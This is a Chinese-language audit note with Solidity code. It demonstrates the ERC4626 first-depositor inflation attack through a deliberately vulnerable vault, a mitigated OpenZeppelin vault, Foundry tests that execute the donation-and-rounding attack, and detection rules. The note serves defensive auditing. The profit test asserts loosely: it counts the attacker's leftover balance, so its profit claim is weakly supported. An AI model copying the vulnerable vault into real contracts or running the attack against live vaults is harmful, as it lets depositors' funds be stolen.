# ERC4626 Inflation Attack — Foundry Test Case

> 可測化漏洞模式：First Depositor Inflation Attack
> 難度：Critical | 頻率：高（2023-2025 多次出現）

## 目的

提供可直接執行的 Foundry 測試，驗證 ERC4626 Vault 是否存在 Inflation Attack 漏洞。

---

## 漏洞合約（Vulnerable）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @notice 有漏洞的簡易 Vault，未使用 virtual offset
contract VulnerableVault is ERC20 {
    IERC20 public immutable asset;

    constructor(IERC20 _asset) ERC20("VulnVault", "vVLT") {
        asset = _asset;
    }

    function totalAssets() public view returns (uint256) {
        return asset.balanceOf(address(this)); // ❌ 可被 donation 操縱
    }

    function deposit(uint256 assets, address receiver) public returns (uint256 shares) {
        uint256 supply = totalSupply();
        if (supply == 0) {
            shares = assets; // 1:1
        } else {
            shares = (assets * supply) / totalAssets(); // ❌ 向下取整，無 virtual offset
        }
        require(shares > 0, "zero shares");
        asset.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(uint256 shares, address receiver) public returns (uint256 assets) {
        assets = (shares * totalAssets()) / totalSupply();
        _burn(msg.sender, shares);
        asset.transfer(receiver, assets);
    }
}
```

## 安全合約（Mitigated）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";

/// @notice 使用 OpenZeppelin ERC4626 + virtual offset 防禦
contract SafeVault is ERC4626 {
    constructor(IERC20 _asset)
        ERC4626(_asset)
        ERC20("SafeVault", "sVLT")
    {}

    function _decimalsOffset() internal pure override returns (uint8) {
        return 3; // 1000 虛擬 shares，大幅提高攻擊成本
    }
}
```

## Foundry 測試

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// 簡化的 mock token
contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1_000_000 ether);
    }
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract InflationAttackTest is Test {
    MockToken token;
    VulnerableVault vulnVault;
    // SafeVault safeVault; // 需要 OZ 依賴

    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");

    function setUp() public {
        token = new MockToken();
        vulnVault = new VulnerableVault(IERC20(address(token)));

        token.mint(attacker, 200 ether);
        token.mint(victim, 100 ether);
    }

    /// @notice 證明漏洞存在：受害者存 99 ETH 獲得 0 shares
    function test_inflationAttack_victimGetsZeroShares() public {
        // Step 1: 攻擊者存入 1 wei
        vm.startPrank(attacker);
        token.approve(address(vulnVault), type(uint256).max);
        vulnVault.deposit(1, attacker);
        assertEq(vulnVault.balanceOf(attacker), 1, "attacker should have 1 share");

        // Step 2: 攻擊者 donate 100 ETH 到 vault
        token.transfer(address(vulnVault), 100 ether);
        vm.stopPrank();

        // Step 3: 受害者存入 99 ETH → 應該 revert（0 shares）
        vm.startPrank(victim);
        token.approve(address(vulnVault), type(uint256).max);
        vm.expectRevert("zero shares");
        vulnVault.deposit(99 ether, victim);
        vm.stopPrank();
    }

    /// @notice 攻擊者獲利分析
    function test_inflationAttack_attackerProfit() public {
        // 攻擊者存 1 wei + donate 100 ETH
        vm.startPrank(attacker);
        token.approve(address(vulnVault), type(uint256).max);
        vulnVault.deposit(1, attacker);
        token.transfer(address(vulnVault), 100 ether);
        vm.stopPrank();

        // 受害者存入 100 ETH + 1（剛好能獲得 1 share）
        uint256 victimDeposit = 100 ether + 1;
        token.mint(victim, victimDeposit);
        vm.startPrank(victim);
        token.approve(address(vulnVault), type(uint256).max);
        vulnVault.deposit(victimDeposit, victim);
        vm.stopPrank();

        // 受害者只拿到 1 share
        assertEq(vulnVault.balanceOf(victim), 1, "victim gets only 1 share");

        // 攻擊者贖回 → 拿走一半 vault
        uint256 totalInVault = token.balanceOf(address(vulnVault));
        vm.prank(attacker);
        vulnVault.redeem(1, attacker);

        uint256 attackerReceived = token.balanceOf(attacker);
        // 攻擊者淨利 ≈ victimDeposit / 2
        assertGt(attackerReceived, 100 ether, "attacker profits from victim's deposit");
    }

    /// @notice 邊界測試：vault 為空時第一筆存款安全
    function test_firstDeposit_noInflation() public {
        vm.startPrank(victim);
        token.approve(address(vulnVault), type(uint256).max);
        vulnVault.deposit(10 ether, victim);
        vm.stopPrank();

        assertEq(vulnVault.balanceOf(victim), 10 ether, "first depositor gets 1:1");
    }
}
```

---

## Scanner 檢測規則

在審計時，掃描以下模式即可識別潛在漏洞：

### 高風險信號
1. `totalAssets()` 使用 `balanceOf(address(this))` 而非內部計數
2. `deposit` 函數中 `shares = assets * supply / totalAssets` 無 virtual offset
3. 缺少 `_decimalsOffset()` override 或 dead shares 初始化
4. 無最小存款限制 (`MIN_DEPOSIT`)

### Semgrep 規則（概念）
```yaml
rules:
  - id: erc4626-no-virtual-offset
    patterns:
      - pattern: |
          function deposit($ASSETS, $RECEIVER) ... {
            ...
            $SHARES = ($ASSETS * totalSupply()) / totalAssets();
            ...
          }
      - pattern-not-inside: |
          function _decimalsOffset() ... { ... }
    message: "ERC4626 vault without virtual offset — vulnerable to inflation attack"
    severity: ERROR
```

---

## 參考

- [OpenZeppelin ERC4626 Defense](https://blog.openzeppelin.com/a-novel-defense-against-erc4626-inflation-attacks)
- [Trail of Bits — Vault Inflation](https://blog.trailofbits.com/)
- 關聯文件: [erc4626-patterns.md](./erc4626-patterns.md)
